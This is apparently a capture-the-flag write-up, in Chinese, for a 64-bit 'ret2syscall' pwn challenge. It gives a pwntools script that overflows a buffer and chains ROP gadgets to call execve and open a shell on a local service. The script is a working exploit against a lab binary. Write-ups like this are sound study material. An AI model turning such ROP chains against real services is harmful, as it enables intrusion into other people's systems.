# ret2syscall

## 文件分析

下载`ret2syscall`, NX on, PIE off, Canary off, RELRO partial  
ghidra分析为64位程序

## 逆向

摆明了随便打

## EXPLOIT

首先要知道64位syscall和32位syscall有什么差别:
(32位见[ctf-wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall))  
64位syscall使用rax作为指令寄存器，这里我们使用execve  
然后execve的三个参数分别放在rdi, rsi, rdx三个寄存器中  
放好后执行syscall指令即可

```python
from pwn import *
sh = remote('localhost', 33359)
popRax = 0x40117e
callObj = 59 # execve
popRsiRdx = 0x401182
popRdi = 0x401180
shstr = 0x404040
syscall = 0x401185
sh.sendline(b'0'*0x48 + p64(popRax) + p64(callObj) + p64(popRsiRdx) + p64(0) + p64(0) + p64(popRdi) + p64(shstr) + p64(syscall))
sh.interactive()
```

Done.
